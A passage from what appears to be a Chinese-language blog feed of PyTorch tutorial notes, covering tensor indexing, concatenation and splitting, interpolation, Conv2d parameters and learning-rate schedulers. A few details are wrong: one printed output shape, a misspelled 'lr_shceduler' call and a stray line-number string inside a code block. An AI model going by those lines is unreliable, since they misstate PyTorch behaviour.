-<span class="number">1.0009</span>],</span><br><span class="line">        [-<span class="number">0.4664</span>,  <span class="number">0.2647</span>, -<span class="number">0.1228</span>, -<span class="number">1.1068</span>],</span><br><span class="line">        [-<span class="number">1.1734</span>, -<span class="number">0.6571</span>,  <span class="number">0.7230</span>, -<span class="number">0.6004</span>]])</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>indices = torch.tensor([<span class="number">0</span>, <span class="number">2</span>])</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>torch.index_select(x, <span class="number">0</span>, indices)</span><br><span class="line">tensor([[ <span class="number">0.1427</span>,  <span class="number">0.0231</span>, -<span class="number">0.5414</span>, -<span class="number">1.0009</span>],</span><br><span class="line">        [-<span class="number">1.1734</span>, -<span class="number">0.6571</span>,  <span class="number">0.7230</span>, -<span class="number">0.6004</span>]])</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>torch.index_select(x, <span class="number">1</span>, indices)</span><br><span class="line">tensor([[ <span class="number">0.1427</span>, -<span class="number">0.5414</span>],</span><br><span class="line">        [-<span class="number">0.4664</span>, -<span class="number">0.1228</span>],</span><br><span class="line">        [-<span class="number">1.1734</span>,  <span class="number">0.7230</span>]])</span><br></pre></td></tr></table></figure><h1 id="四-合并分割">四、合并分割</h1><h2 id="41-torchcat-和-torchstack"><strong>4.1 torch.cat 和 torch.stack</strong></h2><p>可以用 torch.cat 方法和 torch.stack 方法将多个张量合并，也可以用 torch.split方法把一个张量分割成多个张量。torch.cat 和 torch.stack 有略微的区别，torch.cat 是连接，不会增加维度，而 torch.stack 是堆叠，会增加一个维度。两者函数定义如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Concatenates the given sequence of seq tensors in the given dimension. All tensors must either have the same shape (except in the concatenating dimension) or be empty.</span></span><br><span class="line">torch.cat(tensors, dim=<span class="number">0</span>, *, out=<span class="literal">None</span>) → Tensor</span><br><span class="line"><span class="comment"># Concatenates a sequence of tensors along **a new** dimension. All tensors need to be of the same size.</span></span><br><span class="line">torch.stack(tensors, dim=<span class="number">0</span>, *, out=<span class="literal">None</span>) → Tensor</span><br></pre></td></tr></table></figure><p>torch.cat 和 torch.stack 用法实例代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>a = torch.arange(<span class="number">0</span>,<span class="number">9</span>).view(<span class="number">3</span>,<span class="number">3</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>b = torch.arange(<span class="number">10</span>,<span class="number">19</span>).view(<span class="number">3</span>,<span class="number">3</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>c = torch.arange(<span class="number">20</span>,<span class="number">29</span>).view(<span class="number">3</span>,<span class="number">3</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>cat_abc = torch.cat([a,b,c], dim=<span class="number">0</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span>(cat_abc.shape)</span><br><span class="line">torch.Size([<span class="number">9</span>, <span class="number">3</span>])</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span>(cat_abc)</span><br><span class="line">tensor([[ <span class="number">0</span>,  <span class="number">1</span>,  <span class="number">2</span>],</span><br><span class="line">        [ <span class="number">3</span>,  <span class="number">4</span>,  <span class="number">5</span>],</span><br><span class="line">        [ <span class="number">6</span>,  <span class="number">7</span>,  <span class="number">8</span>],</span><br><span class="line">        [<span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>],</span><br><span class="line">        [<span class="number">13</span>, <span class="number">14</span>, <span class="number">15</span>],</span><br><span class="line">        [<span class="number">16</span>, <span class="number">17</span>, <span class="number">18</span>],</span><br><span class="line">        [<span class="number">20</span>, <span class="number">21</span>, <span class="number">22</span>],</span><br><span class="line">        [<span class="number">23</span>, <span class="number">24</span>, <span class="number">25</span>],</span><br><span class="line">        [<span class="number">26</span>, <span class="number">27</span>, <span class="number">28</span>]])</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>stack_abc = torch.stack([a,b,c], axis=<span class="number">0</span>)  <span class="comment"># torch中dim和axis参数名可以混用</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span>(stack_abc.shape)</span><br><span class="line">torch.Size([<span class="number">3</span>, <span class="number">3</span>, <span class="number">3</span>])</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span>(stack_abc)</span><br><span class="line">tensor([[[ <span class="number">0</span>,  <span class="number">1</span>,  <span class="number">2</span>],</span><br><span class="line">         [ <span class="number">3</span>,  <span class="number">4</span>,  <span class="number">5</span>],</span><br><span class="line">         [ <span class="number">6</span>,  <span class="number">7</span>,  <span class="number">8</span>]],</span><br><span class="line"></span><br><span class="line">        [[<span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>],</span><br><span class="line">         [<span class="number">13</span>, <span class="number">14</span>, <span class="number">15</span>],</span><br><span class="line">         [<span class="number">16</span>, <span class="number">17</span>, <span class="number">18</span>]],</span><br><span class="line"></span><br><span class="line">        [[<span class="number">20</span>, <span class="number">21</span>, <span class="number">22</span>],</span><br><span class="line">         [<span class="number">23</span>, <span class="number">24</span>, <span class="number">25</span>],</span><br><span class="line">         [<span class="number">26</span>, <span class="number">27</span>, <span class="number">28</span>]]])</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>chunk_abc = torch.chunk(cat_abc, <span class="number">3</span>, dim=<span class="number">0</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>chunk_abc</span><br><span class="line">(tensor([[<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>],</span><br><span class="line">         [<span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>],</span><br><span class="line">         [<span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>]]),</span><br><span class="line"> tensor([[<span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>],</span><br><span class="line">         [<span class="number">13</span>, <span class="number">14</span>, <span class="number">15</span>],</span><br><span class="line">         [<span class="number">16</span>, <span class="number">17</span>, <span class="number">18</span>]]),</span><br><span class="line"> tensor([[<span class="number">20</span>, <span class="number">21</span>, <span class="number">22</span>],</span><br><span class="line">         [<span class="number">23</span>, <span class="number">24</span>, <span class="number">25</span>],</span><br><span class="line">         [<span class="number">26</span>, <span class="number">27</span>, <span class="number">28</span>]]))</span><br></pre></td></tr></table></figure><h2 id="42-torchsplit-和-torchchunk"><strong>4.2 torch.split 和 torch.chunk</strong></h2><p>torch.split() 和 torch.chunk() 可以看作是 torch.cat() 的逆运算。split() 作用是将张量拆分为多个块，每个块都是原始张量的视图。split() 函数定义如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Splits the tensor into chunks. Each chunk is a view of the original tensor.</span></span><br><span class="line"><span class="string">If split_size_or_sections is an integer type, then tensor will be split into equally sized chunks (if possible). Last chunk will be smaller if the tensor size along the given dimension dim is not divisible by split_size.</span></span><br><span class="line"><span class="string">If split_size_or_sections is a list, then tensor will be split into len(split_size_or_sections) chunks with sizes in dim according to split_size_or_sections.</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">torch.split(tensor, split_size_or_sections, dim=<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>chunk() 作用是将 tensor 按 dim（行或列）分割成 chunks 个 tensor 块，返回的是一个元组。chunk() 函数定义如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">torch.chunk(<span class="built_in">input</span>, chunks, dim=<span class="number">0</span>) → <span class="type">List</span> of Tensors</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Splits a tensor into a specific number of chunks. Each chunk is a view of the input tensor.</span></span><br><span class="line"><span class="string">Last chunk will be smaller if the tensor size along the given dimension dim is not divisible by chunks.</span></span><br><span class="line"><span class="string">Parameters:</span></span><br><span class="line"><span class="string">    input (Tensor) – the tensor to split</span></span><br><span class="line"><span class="string">    chunks (int) – number of chunks to return</span></span><br><span class="line"><span class="string">    dim (int) – dimension along which to split the tensor</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure><p>实例代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>a = torch.arange(<span class="number">10</span>).reshape(<span class="number">5</span>,<span class="number">2</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a</span><br><span class="line">tensor([[<span class="number">0</span>, <span class="number">1</span>],</span><br><span class="line">        [<span class="number">2</span>, <span class="number">3</span>],</span><br><span class="line">        [<span class="number">4</span>, <span class="number">5</span>],</span><br><span class="line">        [<span class="number">6</span>, <span class="number">7</span>],</span><br><span class="line">        [<span class="number">8</span>, <span class="number">9</span>]])</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>torch.split(a, <span class="number">2</span>)</span><br><span class="line">(tensor([[<span class="number">0</span>, <span class="number">1</span>],</span><br><span class="line">         [<span class="number">2</span>, <span class="number">3</span>]]),</span><br><span class="line"> tensor([[<span class="number">4</span>, <span class="number">5</span>],</span><br><span class="line">          [<span class="number">6</span>, <span class="number">7</span>]]),</span><br><span class="line"> tensor([[<span class="number">8</span>, <span class="number">9</span>]]))</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>torch.split(a, [<span class="number">1</span>,<span class="number">4</span>])</span><br><span class="line">(tensor([[<span class="number">0</span>, <span class="number">1</span>]]),</span><br><span class="line"> tensor([[<span class="number">2</span>, <span class="number">3</span>],</span><br><span class="line">         [<span class="number">4</span>, <span class="number">5</span>],</span><br><span class="line">         [<span class="number">6</span>, <span class="number">7</span>],</span><br><span class="line">         [<span class="number">8</span>, <span class="number">9</span>]]))</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>torch.chunk(a, <span class="number">2</span>, dim=<span class="number">1</span>)</span><br><span class="line">(tensor([[<span class="number">0</span>],</span><br><span class="line">        [<span class="number">2</span>],</span><br><span class="line">        [<span class="number">4</span>],</span><br><span class="line">        [<span class="number">6</span>],</span><br><span class="line">        [<span class="number">8</span>]]), </span><br><span class="line">tensor([[<span class="number">1</span>],</span><br><span class="line">        [<span class="number">3</span>],</span><br><span class="line">        [<span class="number">5</span>],</span><br><span class="line">        [<span class="number">7</span>],</span><br><span class="line">        [<span class="number">9</span>]]))</span><br></pre></td></tr></table></figure><h1 id="五-卷积相关算子">五、卷积相关算子</h1><h2 id="51-上采样方法总结"><strong>5.1 上采样方法总结</strong></h2><p>上采样大致被总结成了三个类别：</p><ol><li>基于线性插值的上采样：最近邻算法（nearest）、双线性插值算法（bilinear）、双三次插值算法（bicubic）等，这是传统图像处理方法。</li><li>基于深度学习的上采样（转置卷积，也叫反卷积 Conv2dTranspose2d等）</li><li>Unpooling 的方法（简单的补零或者扩充操作）<br>计算效果：最近邻插值算法 &lt; 双线性插值 &lt; 双三次插值。计算速度：最近邻插值算法 &gt; 双线性插值 &gt; 双三次插值。</li></ol><h2 id="52-finterpolate-采样函数"><strong>5.2 F.interpolate 采样函数</strong></h2><blockquote><p>Pytorch 老版本有 nn.Upsample 函数，新版本建议用 torch.nn.functional.interpolate，一个函数可实现定制化需求的上采样或者下采样功能，。</p></blockquote><p>F.interpolate() 函数全称是 torch.nn.functional.interpolate()，函数定义如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">interpolate</span>(<span class="params"><span class="built_in">input</span>, size=<span class="literal">None</span>, scale_factor=<span class="literal">None</span>, mode=<span class="string">&#x27;nearest&#x27;</span>, align_corners=<span class="literal">None</span>, recompute_scale_factor=<span class="literal">None</span></span>):  <span class="comment"># noqa: F811</span></span><br><span class="line">    <span class="comment"># type: (Tensor, <span class="type">Optional</span>[<span class="built_in">int</span>], <span class="type">Optional</span>[<span class="type">List</span>[<span class="built_in">float</span>]], <span class="built_in">str</span>, <span class="type">Optional</span>[<span class="built_in">bool</span>], <span class="type">Optional</span>[<span class="built_in">bool</span>]) -&gt; Tensor</span></span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p>参数解释如下：</p><ul><li>input(Tensor)：输入张量数据；</li><li>size： 输出的尺寸，数据类型为 tuple： ([optional D_out], [optional H_out], W_out)，和 scale_factor 二选一；</li><li>scale_factor：在高度、宽度和深度上面的放大倍数。数据类型既可以是 int——表明高度、宽度、深度都扩大同一倍数；也可是tuple——指定高度、宽度、深度等维度的扩大倍数；</li><li>mode： 上采样的方法，包括最近邻（nearest），线性插值（linear），双线性插值（bilinear），三次线性插值（trilinear），默认是最近邻（nearest）；</li><li>align_corners： 如果设为True，输入图像和输出图像角点的像素将会被对齐（aligned），这只在mode = linear, bilinear, or trilinear才有效，默认为False。</li></ul><p>例子程序如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> torch.nn.functional <span class="keyword">as</span> F</span><br><span class="line">x = torch.rand(<span class="number">1</span>,<span class="number">3</span>,<span class="number">224</span>,<span class="number">224</span>)</span><br><span class="line">y = F.interpolate(x * <span class="number">2</span>, scale_factor=(<span class="number">2</span>, <span class="number">2</span>), mode=<span class="string">&#x27;bilinear&#x27;</span>).squeeze(<span class="number">0</span>)</span><br><span class="line"><span class="built_in">print</span>(y.shape)   <span class="comment"># torch.Size([3, 224, 224])</span></span><br></pre></td></tr></table></figure><h2 id="53-nnconvtranspose2d-反卷积"><strong>5.3 nn.ConvTranspose2d 反卷积</strong></h2><p>转置卷积（有时候也称为反卷积，个人觉得这种叫法不是很规范），它是一种特殊的卷积，先 padding 来扩大图像尺寸，紧接着跟正向卷积一样，旋转卷积核 180 度，再进行卷积计算。</p><h1 id="引用">引用</h1><p>[0] <a href="http://zhuanlan.zhihu.com/p/">zhuanlan.zhihu.com/p/</a><br>[1] <a href="https://blog.csdn.net/Flag_ing/article/details/109129752">https://blog.csdn.net/Flag_ing/article/details/109129752</a><br>[2] <a href="https://zhuanlan.zhihu.com/p/361209187">https://zhuanlan.zhihu.com/p/361209187</a></p>]]></content>
      
      
      <categories>
          
          <category> Pytorch </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Pytorch </tag>
            
            <tag> tensor </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>torch tensor 计算</title>
      <link href="/2023/12/19/AILearning/pytorch/tensor%E8%AE%A1%E7%AE%97/"/>
      <url>/2023/12/19/AILearning/pytorch/tensor%E8%AE%A1%E7%AE%97/</url>
      
        <content type="html"><![CDATA[<h4 id="torchmean">torch.mean()</h4><blockquote><p>mean()函数的参数：dim=0,按行求平均值，返回的形状是（1，列数）；dim=1,按列求平均值，返回的形状是（行数，1）,默认不设置dim的时候，返回的是所有元素的平均值。</p></blockquote><h4 id="torchpow">torch.pow()</h4><blockquote><p>功能: 实现张量和标量之间逐元素求指数操作, 或者在可广播的张量之间逐元素求指数操作.</p></blockquote><h4 id="torchstack">torch.stack()</h4><blockquote><p>官方解释：沿着一个新维度对输入张量序列进行连接。 序列中所有的张量都应该为相同形状。</p><p>注：<code>python</code>的序列数据只有<code>list</code>和<code>tuple</code>。</p><p>浅显说法：把多个2维的张量凑成一个3维的张量；多个3维的凑成一个4维的张量…以此类推，也就是在增加新的维度进行堆叠。</p><p>outputs = torch.stack(inputs, dim=?) → Tensor</p></blockquote><h4 id="torchclamp">torch.clamp()</h4><blockquote><p>torch.clamp(input, min, max, out=None) → Tensor</p><p>将输入<code>input</code>张量每个元素的夹紧到区间 [min,max][min,max]，并返回结果到一个新张量。</p></blockquote><h4 id="torchbmm">torch.bmm()</h4><blockquote><p>计算两个tensor的矩阵乘法，torch.bmm(a,b),tensor a 的size为(b,h,w),tensor b的size为(b,w,m) 也就是说两个tensor的第一维是相等的，然后第一个数组的第三维和第二个数组的第二维度要求一样，对于剩下的则不做要求，输出维度 （b,h,m）;</p></blockquote><h4 id="torchsqueeze函数">torch.squeeze()函数</h4><blockquote><p>torch.squeeze(input, dim=None, out=None)</p><p>squeeze()函数的功能是维度压缩。返回一个tensor（张量），其中 input 中大小为1的所有维都已删除。</p><p>举个例子：如果 input 的形状为 (A×1×B×C×1×D)，那么返回的tensor的形状则为 (A×B×C×D)</p><p>当给定 dim 时，那么只在给定的维度（dimension）上进行压缩操作。</p><p>举个例子：如果 input 的形状为 (A×1×B)，squeeze(input, 0)后，返回的tensor不变；squeeze(input, 1)后，返回的tensor将被压缩为 (A×B)</p></blockquote><h4 id="torchunsqueeze">torch.unsqueeze()</h4><blockquote></blockquote><h4 id="torchspmm">torch.spmm</h4><blockquote><p>torch.spmm只支持 sparse 在前，dense 在后的矩阵乘法，两个sparse相乘或者dense在前的乘法不支持，当然两个dense矩阵相乘是支持的。</p></blockquote><h4 id="torchsum">torch.sum</h4><blockquote><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202312191625912.png" alt="img"></p><p>在dim这个维度上，对里面的tesnor 进行加和，如果keepdim=False，返回结果会删去dim这个维度。因为在dim上加和之后，dim=1，所以可以直接删去。</p></blockquote><h4 id="torchdiag">torch.diag</h4><blockquote><p>对角矩阵</p></blockquote><h4 id="torchconcat">torch.concat</h4><blockquote><p>torch.cat ( (A, B), dim=0)接受一个由两个（或多个）tensor组成的元组，按行拼接，所以两个（多个）tensor的列数要相同。</p><p>torch.cat ( (A, B), dim=1)是按列拼接，所以两个tensor的行数要相同。</p></blockquote><h4 id="torchview">torch.view</h4><blockquote><p>在PyTorch中<strong>view</strong>函数作用为重构张量的维度，相当于numpy中的resize()的功能，但是用法不太一样;</p><p>torch.view(参数a,参数b,…)，其中参数a=3,参数b=2决定了将一维的tt1重构成3*2维的张量。<br>有时候会出现torch.view(-1)或者torch.view(参数a,-1)这种情况。则-1参数是需要估算的。</p><p><strong>view()函数的功能与reshape类似，用来转换size大小。x = x.view(batchsize, -1)中batchsize指转换后有几行，而-1指在不告诉函数有多少列的情况下，根据原tensor数据和batchsize自动分配列数。</strong></p><p>之前对于pytorch的网络编程学习都是大致理解每一层的概念，有些语法语句没有从原理上弄清楚，就比如标题的x = x.view(x.size(0), -1)  。</p><p>这句话一般出现在model类的forward函数中，具体位置一般都是在调用分类器之前。分类器是一个简单的nn.Linear()结构，输入输出都是维度为一的值，x = x.view(x.size(0), -1)  这句话的出现就是为了将前面多维度的tensor展平成一维。</p></blockquote><h4 id="torchpermute">torch.permute</h4><blockquote><p>permute（dims）<br>参数dims用矩阵的维数代入，一般默认从0开始。即第0维，第1维等等<br>也可以理解为，第0块，第1块等等。当然矩阵最少是两维才能使用permute<br>如是两维，dims分别为是0和1<br>可以写成permute（0,1）这里不做任何变化，维数与之前相同<br>如果写成permute（1,0）得到的就是矩阵的转置<br>如果三维是permute(0,1,2)<br>0代表共有几块维度：本例中0对应着3块矩阵<br>1代表每一块中有多少行：本例中1对应着每块有2行<br>2代表每一块中有多少列：本例中2对应着每块有5列<br>所以是3块2行5列的三维矩阵</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Pytorch </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Pytorch </tag>
            
            <tag> tensor </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Conv2d</title>
      <link href="/2023/12/19/AILearning/pytorch/conv2d/"/>
      <url>/2023/12/19/AILearning/pytorch/conv2d/</url>
      
        <content type="html"><![CDATA[<h4 id="1-用法">1 用法</h4><ul><li>Conv2d(in_channels, out_channels, kernel_size, stride=1,padding=0, dilation=1, groups=1,bias=True, padding_mode=‘zeros’)</li></ul><h4 id="2-参数">2 参数</h4><ul><li><p>in_channels：输入的通道数目 【必选】</p></li><li><p>out_channels： 输出的通道数目 【必选】</p></li><li><p>kernel_size：卷积核的大小，类型为int 或者元组，当卷积是方形的时候，只需要一个整数边长即可，卷积不是方形，要输入一个元组表示 高和宽。【必选】</p></li><li><p>stride： 卷积每次滑动的步长为多少，默认是 1 【可选】</p></li><li><p>padding： 设置在所有边界增加 值为 0 的边距的大小（也就是在feature map 外围增加几圈 0 ），例如当 padding =1 的时候，如果原来大小为 3 × 3 ，那么之后的大小为 5 × 5 。即在外围加了一圈 0 。【可选】</p></li><li><p>dilation：控制卷积核之间的间距（什么玩意？请看例子）【可选】</p></li><li><p>groups：控制输入和输出之间的连接。（不常用）【可选】</p><p>举例来说：<br>比如 groups 为1，那么所有的输入都会连接到所有输出<br>当 groups 为 2的时候，相当于将输入分为两组，并排放置两层，每层看到一半的输入通道并产生一半的输出通道，并且两者都是串联在一起的。这也是参数字面的意思：“组” 的含义。<br>需要注意的是，in_channels 和 out_channels 必须都可以整除 groups，否则会报错（因为要分成这么多组啊，除不开你让人家程序怎么办？）</p></li><li><p>bias： 是否将一个 学习到的 bias 增加输出中，默认是 True 。【可选】</p></li><li><p>padding_mode ： 字符串类型，接收的字符串只有 “zeros” 和 “circular”。【可选】</p></li></ul><h4 id="3-相关形状">3 相关形状</h4><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202312191632440.png" alt="image-20231219163239412"></p>]]></content>
      
      
      <categories>
          
          <category> Pytorch </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CNN </tag>
            
            <tag> Pytorch </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Pytorch学习率衰减方法</title>
      <link href="/2023/12/19/AILearning/pytorch/%E5%AD%A6%E4%B9%A0%E7%8E%87%E8%A1%B0%E5%87%8F/"/>
      <url>/2023/12/19/AILearning/pytorch/%E5%AD%A6%E4%B9%A0%E7%8E%87%E8%A1%B0%E5%87%8F/</url>
      
        <content type="html"><![CDATA[<h3 id="pytorch"><a href="https://so.csdn.net/so/search?q=Pytorch&amp;spm=1001.2101.3001.7020">Pytorch</a> 学习率衰减方法</h3><h1 id="1什么是学习率衰减">1.什么是学习率衰减</h1><p><a href="https://so.csdn.net/so/search?q=%E6%A2%AF%E5%BA%A6%E4%B8%8B%E9%99%8D&amp;spm=1001.2101.3001.7020">梯度下降</a>算法需要我们指定一个学习率作为权重更新步幅的控制因子，常用的学习率有0.01、0.001以及0.0001等，学习率越大则权重更新。一般来说，<strong>我们希望在训练初期学习率大一些，使得网络收敛迅速，在训练后期学习率小一些，使得网络更好的收敛到最优解。</strong><br>Pytorch中有两种学习率调整(衰减)方法：<br>（1）使用<a href="https://so.csdn.net/so/search?q=%E5%BA%93%E5%87%BD%E6%95%B0&amp;spm=1001.2101.3001.7020">库函数</a>进行调整；<br>（2）手动调整。</p><h1 id="2使用库函数进行调整">2.使用库函数进行调整</h1><p>Pytorch学习率调整策略通过 <a href="https://so.csdn.net/so/search?q=torch&amp;spm=1001.2101.3001.7020">torch</a>.optim.lr_sheduler 接口实现。pytorch提供的学习率调整策略分为三大类，分别是：<br>（1）有序调整：等间隔调整(Step)，多间隔调整(MultiStep)，指数衰减(Exponential)，余弦退火(CosineAnnealing);<br>（2）自适应调整：依训练状况伺机而变，通过监测某个指标的变化情况(loss、accuracy)，当该指标不怎么变化时，就是调整学习率的时机(ReduceLROnPlateau);<br>（3）自定义调整：通过自定义关于epoch的lambda函数调整学习率(LambdaLR)。<br>在每个epoch的训练中，使用scheduler.step()语句进行学习率更新</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">optimizer = torch.optim.SGD(model.parameters(), lr=<span class="number">0.1</span>)</span><br><span class="line">scheduler = torch.optim.lr_scheduler.StepLR(optimizer, step_size=<span class="number">30</span>, gamma=<span class="number">0.1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">train</span>(<span class="params">...</span>):</span><br><span class="line">    <span class="keyword">for</span> i, data <span class="keyword">in</span> <span class="built_in">enumerate</span>(train_loader):</span><br><span class="line">        ......</span><br><span class="line">        y_ = model(x)</span><br><span class="line">        loss = criterion(y_,y)</span><br><span class="line">        loss.backward()</span><br><span class="line">        optimizer.step()</span><br><span class="line">        ......</span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> epoch <span class="keyword">in</span> <span class="built_in">range</span>(epochs):</span><br><span class="line">    train(...)</span><br><span class="line">    test(...)</span><br><span class="line">    scheduler.step()</span><br><span class="line"><span class="number">12345678910111213141516</span></span><br></pre></td></tr></table></figure><h2 id="21有序调整">2.1.有序调整</h2><h3 id="211等间隔调整学习率">2.1.1等间隔调整学习率</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">torch.optim.lr_scheduler.StepLR(optimizer, step_size, gamma=<span class="number">0.1</span>, last_epoch=-<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>每训练step_size个epoch，学习率调整为lr=lr*gamma.<br>以下内容中都将epoch和step对等，因为每个epoch中只进行一次scheduler.step()，实则该step指scheduler.step()中的step, 即step_size指scheduler.step()进行的次数。<br>参数</p><ul><li>optimizer: 神经网络训练中使用的优化器，如optimizer=torch.optim.SGD(…)</li><li>step_size(int): 学习率下降间隔数，单位是epoch，而不是iteration.</li><li>gamma(float):学习率调整倍数，默认为0.1</li><li>last_epoch(int)：上一个epoch数，这个变量用来指示学习率是否需要调整。当last_epoch符合设定的间隔时，就会对学习率进行调整；当为-1时，学习率设置为初始值。<br><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202312191635978.png" alt="img"></li></ul><h3 id="212多间隔调整学习率">2.1.2.多间隔调整学习率</h3><p>跟2.1类似，但学习率调整的间隔并不是相等的，如epoch=10时调整一次，epoch=30时调整一次，epoch=80时调整一次…</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">torch.optim.lr_shceduler.MultiStepLR(optimizer, milestones, gamma=<span class="number">0.1</span>, last_epoch=-<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>参数：</p><ul><li>milestone(list): 一个列表参数，表示多个学习率需要调整的epoch值，如milestones=[10, 30, 80].</li><li>其它参数同(1)。<br><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202312191635994.png" alt="img"></li></ul><h3 id="213指数衰减调整学习率-exponentiallr">2.1.3.指数衰减调整学习率 ExponentialLR</h3><p>学习率呈指数型衰减，每训练一个epoch，lr=lr×γepoch</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">torch.optim.lr_scheduler.ExponentialLR(optimizer, gamma, last_epoch)</span><br></pre></td></tr></table></figure><p>参数：</p><ul><li>gamma(float)：学习率调整倍数的底数，指数为epoch，初始值我lr, 倍数为γepoch</li><li>其它参数同上。<br><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202312191635065.png" alt="img"></li></ul><h3 